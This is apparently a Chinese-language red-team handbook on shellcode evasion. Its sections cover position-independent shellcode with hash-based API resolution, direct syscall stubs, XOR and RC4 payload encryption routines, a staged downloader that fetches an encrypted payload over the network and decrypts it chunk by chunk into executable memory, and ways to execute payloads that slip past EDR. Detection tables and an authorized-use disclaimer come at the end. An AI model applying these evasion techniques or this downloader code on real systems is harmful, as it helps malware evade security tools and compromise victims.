# Shellcode Evasion — 开发、编码、分阶段、执行

> 本文件为 `evasion-comprehensive.md` §3/§9 的伴生手册（补齐「Full shellcode evasion guide」断链）。
> 覆盖 shellcode **开发 → 编码/加密 → 分阶段(staging) → 执行方式 → 检测侧 → 实测判据**。
> 授权立场与检测侧配对纪律见 `refs/README.md`。

## 0. 总原则

- **静态**：无明文特征（字符串/函数名/URL），低熵或伪低熵。
- **动态**：内存中最小化明文驻留时间（加密 + 分段解密），规避「写后执行」时间窗。
- **执行**：避免 `VirtualAlloc(RWX)` + `CreateThread` 组合；用 RW→RX 分离或回调/复用线程。

---

## 1. Shellcode 开发

### 1.1 位置无关代码（PIC）

```c
// PIC 核心：不依赖绝对地址，API 全部动态解析（见 T039）
PPEB peb = (PPEB)__readgsqword(0x60);   // x64 取 PEB
// 遍历 PEB->Ldr 拿 kernel32/ntdll 基址 -> 导出表 hash 解析 GetProcAddress/LoadLibrary
// 之后所有调用都经「hash -> 导出表 -> 地址」链，shellcode 内无 IAT、无绝对跳转
```

### 1.2 自包含（无 CRT）

```c
// 编译选项：不链接 CRT，体积最小、导入最简
// cl /O1 /GS- /NODEFAULTLIB /ENTRY:entry kernel32.lib
void entry() { ExitProcess(main_logic()); }
```

### 1.3 系统调用直调

```nasm
; x64 direct syscall（见 ADVANCED_EVASION.md 详版）
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 18h        ; SSN（版本相关）
    syscall
    ret
```

---

## 2. 编码与加密

### 2.1 XOR（简单、快）

```c
void xor_crypt(BYTE* buf, SIZE_T len, BYTE* key, SIZE_T klen) {
    for (SIZE_T i = 0; i < len; i++) buf[i] ^= key[i % klen];
}
```

### 2.2 RC4（流密码，实现简单）

```c
// RC4 KSA + PRGA（骨架示例）
void rc4(BYTE* data, SIZE_T len, BYTE* key, SIZE_T klen) {
    BYTE S[256]; int j = 0;
    for (int i = 0; i < 256; i++) S[i] = i;
    for (int i = 0; i < 256; i++) { j = (j + S[i] + key[i % klen]) & 0xFF; SWAP(S[i], S[j]); }
    int i = 0; j = 0;
    for (SIZE_T n = 0; n < len; n++) {
        i = (i + 1) & 0xFF; j = (j + S[i]) & 0xFF; SWAP(S[i], S[j]);
        data[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}
```

### 2.3 AES（推荐，抗静态）

```c
// 生成侧：AES-256-CTR，随机 nonce，密钥经主密钥派生（libsodium / BCrypt）
// 加载侧：只解密即将执行的分段，执行后再加密（分段解密避免整段明文驻留）
```

### 2.4 多层/哈夫曼编码

```c
// 哈夫曼编码：按字节频率建树，编码为变长位流，解码端内嵌码表（见 T168）
// 多层嵌套：XOR -> base64 -> RC4 逐层解，对抗静态递归解包
```

---

## 3. 分阶段加载（Staging）

```c
// Stage 1（小、加密、低特征）：下载器
// Stage 2（运行时下载、加密）：真正的 payload
// Stage 3（内存解密）：执行
// 关键：任何时刻磁盘/内存都不存在完整明文 payload
HINTERNET h = InternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
HINTERNET c = InternetOpenUrlA(h, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
// 分块 InternetReadFile -> 逐块解密 -> 逐块写入可执行区 -> 拼齐执行
```

**异地解密（远程进程/父进程解密，P1 深补）**：payload 在 A 进程解密，通过共享内存/section 传给 B 进程执行，解密动作与执行动作分离到不同进程，降低单进程内存扫描命中率。详见 `OPSEC_HARDENING.md`。

---

## 4. 执行方式

| 方式 | API | 检测侧 |
|---|---|---|
| 函数指针 | `VirtualAlloc(RX)` + cast 调用 | RX 内存 + 匿名执行 |
| 回调执行 | `EnumWindows` 等（见 `PROCESS_INJECTION.md` §7） | 回调指针落私有 RX |
| Fiber | `ConvertThreadToFiber`/`CreateFiber`/`SwitchToFiber` | fiber 遥测 |
| ThreadPool | `CreateThreadpoolWork` + `SubmitThreadpoolWork` | TP work 回调异常 |
| 线程复用 | Thread Hijack / Threadless（见 `PROCESS_INJECTION.md` §6） | 线程状态突变 |
| 硬件断点 | DR0-DR3 + VEH（见 `AMSI_BYPASS_TECHNIQUES.md` §4） | 调试寄存器 |

---

## 5. 检测侧总表（回馈 attack-defense）

| 环节 | 检测点 | 判据 |
|---|---|---|
| 静态 | 高熵 + 无 IAT + 危险字符串 | 熵值启发 + 函数级行为指纹 |
| 编码 | XOR/RC4 弱熵 + 解码循环 | 熵分析 + 解码 stub 特征 |
| staging | 异常下载 + 分块写执行区 | 网络遥测 + 写入-执行间隔 |
| 执行 | RX 内存 + 匿名调用 | 内存保护属性 + 栈回溯 |

## 6. 实测判据汇总

| 判据 | 方法 |
|---|---|
| shellcode 是否静态可识别 | `strings`/YARA 扫描是否命中危险特征 |
| 是否规避「写后执行」 | 内存保护属性轨迹（RW 写 → 延迟 → RX 执行） |
| 是否被内存扫描 | 睡眠期内存快照是否出现明文 payload |

*WARNING: 授权红队评估与安全研究专用。*
